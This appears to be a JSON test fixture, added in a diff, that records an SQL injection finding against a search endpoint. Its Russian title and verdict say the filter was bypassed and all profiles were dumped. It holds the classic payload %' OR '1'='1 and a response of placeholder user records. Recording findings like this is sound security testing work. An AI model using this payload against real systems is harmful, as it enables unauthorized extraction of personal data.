@@ -1,0 +1,21 @@
+{
+  "name": "02_sqli_search",
+  "title": "SQL-инъекция в GET /search?q=",
+  "request": "GET /search?q=%' OR '1'='1",
+  "status": 200,
+  "response": [
+    {
+      "id": 1,
+      "name": "TEST_ALICE",
+      "email": "alice@example.invalid",
+      "address": "TEST_ADDRESS_A"
+    },
+    {
+      "id": 2,
+      "name": "TEST_BOB",
+      "email": "bob@example.invalid",
+      "address": "TEST_ADDRESS_B"
+    }
+  ],
+  "verdict": "Условие обойдено, выгружены все профили"
+}
